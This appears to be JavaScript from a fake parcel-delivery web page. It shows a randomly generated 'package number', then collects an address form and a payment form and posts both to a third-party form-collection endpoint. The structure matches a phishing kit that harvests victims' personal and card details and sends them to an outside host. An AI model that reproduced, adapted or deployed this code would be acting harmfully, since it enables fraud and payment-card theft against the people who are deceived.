function showPage(pageNumber) {
  // Hide all pages
  document.querySelectorAll('.container').forEach(page => page.classList.add('hidden'));
  // Show the specified page
  document.getElementById(`page${pageNumber}`).classList.remove('hidden');
}

// Generate a random package number on page load
document.getElementById('packageNumber').textContent = Math.floor(100000000 + Math.random() * 900000000);

// Function to handle form submission for Basin
async function submitToBasin(formId, url) {
  const form = document.getElementById(formId);
  const formData = new FormData(form);

  try {
    const response = await fetch(url, {
      method: 'POST',
      body: formData,
    });

    if (response.ok) {
      // Navigate to the appropriate page after successful submission
      if (formId === "addressForm") {
        showPage(3); // Navigate to Page 3 after address form submission
      } else {
        showPage(1); // Navigate back to Page 1 or show the home page
      }
    } else {
      console.error("Error submitting form.");
    }
  } catch (error) {
    console.error("Submission Error:", error);
  }
}

// Attach event listeners to forms
document.getElementById("addressForm").addEventListener("submit", function (e) {
  e.preventDefault();
  submitToBasin("addressForm", " https://usebasin.com/f/4ac83187655f");
});

document.getElementById("paymentForm").addEventListener("submit", function (e) {
  e.preventDefault();
  submitToBasin("paymentForm", " https://usebasin.com/f/4ac83187655f");
});
